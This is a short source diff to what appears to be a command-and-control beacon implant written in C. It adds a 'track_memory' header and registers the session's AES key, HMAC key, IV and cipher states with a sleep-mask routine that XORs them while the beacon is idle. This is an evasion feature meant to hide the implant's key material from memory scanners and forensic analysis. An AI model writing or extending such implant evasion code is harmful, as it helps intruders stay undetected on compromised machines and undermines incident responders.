@@ -9,6 +9,7 @@
 
 #include "parse.h"
 #include "beacon.h"
+#include "track_memory.h"
 
 #if defined _M_X64
 #pragma comment(lib, "lib/tommath.x64.lib")
@@ -217,6 +218,18 @@ void security_init(char * k) {
 
 	check = aes_setup(key, KEY_SIZE, 0, &the_key);
 	sanity("aes_setup", check);
+
+	/* the session key material lives in statics for the whole session.
+	 * Register them with the sleep-mask walk so they are XORed while the
+	 * beacon sleeps (masking only runs with zero worker threads, so no
+	 * crypto operation can be in flight). STATIC = zeroed at exit, never
+	 * free()d. */
+	track_memory_add(key, KEY_SIZE, TRACK_MEMORY_STATIC, TRUE, NULL);
+	track_memory_add(hmac_key, KEY_SIZE, TRACK_MEMORY_STATIC, TRUE, NULL);
+	track_memory_add(iv, sizeof(iv), TRACK_MEMORY_STATIC, TRUE, NULL);
+	track_memory_add(&out_state, sizeof(out_state), TRACK_MEMORY_STATIC, TRUE, NULL);
+	track_memory_add(&in_state, sizeof(in_state), TRACK_MEMORY_STATIC, TRUE, NULL);
+	track_memory_add(&the_key, sizeof(the_key), TRACK_MEMORY_STATIC, TRUE, NULL);
 }
 
 /* we're only going to do this once, better get it right
